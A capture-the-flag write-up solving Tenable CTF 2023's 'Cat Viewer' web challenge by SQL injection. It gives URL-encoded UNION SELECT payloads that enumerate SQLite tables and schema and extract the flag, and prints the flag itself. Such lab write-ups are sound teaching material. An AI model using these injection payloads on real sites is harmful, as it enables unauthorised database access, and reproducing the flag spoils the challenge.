# Tenable Capture the Flag 2023

## Cat Viewer

> I built a little web site to search through my archive of cat photos. I hid a little something extra in the database too. See if you can find it!
>
>  Author: N/A
>

Tags: _web_

## Solution
The webapp given for this challenge allows to query cats. The query name is known as the link from the challenge description automatically shows a cat named `Shelton` (https://nessus-catviewer.chals.io/index.php?cat=Shelton).

After some trial and error I got an interesting error when entering `"`:
```
Searching for cats with names like "


Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: """ in /var/www/html/index.php on line 19

Fatal error: Uncaught Error: Call to a member function numColumns() on bool in /var/www/html/index.php:21 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 21
```

So, this is a `sqli` vulnerability we are looking for. Also we know we have a `SQLite` database running at the other end. With this information we can start some recon, first we check if a `union select` works and what parameter is displayed:

```
https://nessus-catviewer.chals.io/index.php?cat=Shelton%22%20UNION%20SELECT%201,2,3,4%20--%20-

Searching for cats with names like Shelton" UNION SELECT 1,2,3,4 -- -

Name: 3
```

Knowing we can inject into parameter `3` we can try to find the name of the table that is queried.
```
https://nessus-catviewer.chals.io/index.php?cat=Shelton%22%20UNION%20SELECT%201,2,name,4%20from%20sqlite_master%20WHERE%20type%20=%27table%27--%20-

Searching for cats with names like Shelton" UNION SELECT 1,2,name,4 from sqlite_master WHERE type ='table'-- -

Name: cats


Name: sqlite_sequence
```

Then we need to know the columns of the table to see if the flag is hidden in another column. And, yes... The flag is in column `flag` within table `cats`.
```
https://nessus-catviewer.chals.io/index.php?cat=Shelton%22%20UNION%20SELECT%201,2,sql,4%20from%20sqlite_master%20WHERE%20type%20!=%27meta%27%20and%20tbl_name%20NOT%20like%20%27sqlite_%%27%20and%20name=%27cats%27--%20-

Searching for cats with names like Shelton" UNION SELECT 1,2,sql,4 from sqlite_master WHERE type !='meta' and tbl_name NOT like 'sqlite_%' and name='cats'-- -

Name: CREATE TABLE cats ( id INTEGER PRIMARY KEY AUTOINCREMENT, image TEXT NOT NULL, name TEXT NOT NULL, flag TEXT NOT NULL )

```

Knowing this all we can query the flag:
```
https://nessus-catviewer.chals.io/index.php?cat=Shelton%22%20UNION%20SELECT%201,2,flag,4%20from%20cats%20--%20-

Searching for cats with names like Shelton" UNION SELECT 1,2,flag,4 from cats -- -

Name:


Name: flag{a_sea_of_cats}

```

Flag `flag{a_sea_of_cats}`